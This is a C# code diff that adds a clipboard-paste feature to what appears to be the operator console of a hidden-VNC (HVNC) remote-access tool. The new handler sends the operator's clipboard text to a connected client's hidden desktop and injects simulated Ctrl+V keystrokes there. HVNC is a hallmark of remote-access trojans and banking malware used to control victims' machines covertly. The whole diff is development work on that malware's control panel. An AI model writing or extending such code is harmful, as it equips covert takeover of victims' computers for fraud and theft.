@@ -155,6 +155,33 @@ public partial class HvncWindow : Window
         });
     }
 
+    // Push the server clipboard text to the remote hidden desktop
+    private void BtnClipboard_Click(object s, RoutedEventArgs e)
+    {
+        string text;
+        try { text = System.Windows.Clipboard.GetText(); }
+        catch { text = ""; }
+        if (string.IsNullOrEmpty(text)) return;
+
+        // 1. Send the text to the client's hidden desktop clipboard
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.HvncClipboard,
+            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncClipboardData { Text = text })
+        });
+
+        // 2. Simulate Ctrl+V on the remote desktop so it pastes immediately
+        var ctrlDown = new HvncInputData { T = "kk", VK = 0x11, Down = true  };  // VK_CONTROL
+        var vDown    = new HvncInputData { T = "kk", VK = 0x56, Down = true  };  // V
+        var vUp      = new HvncInputData { T = "kk", VK = 0x56, Down = false };
+        var ctrlUp   = new HvncInputData { T = "kk", VK = 0x11, Down = false };
+
+        SendInput(ctrlDown);
+        SendInput(vDown);
+        SendInput(vUp);
+        SendInput(ctrlUp);
+    }
+
     // ── Incoming ──────────────────────────────────────────────────────────────
 
     private void OnHvncFrame(string clientId, string json)
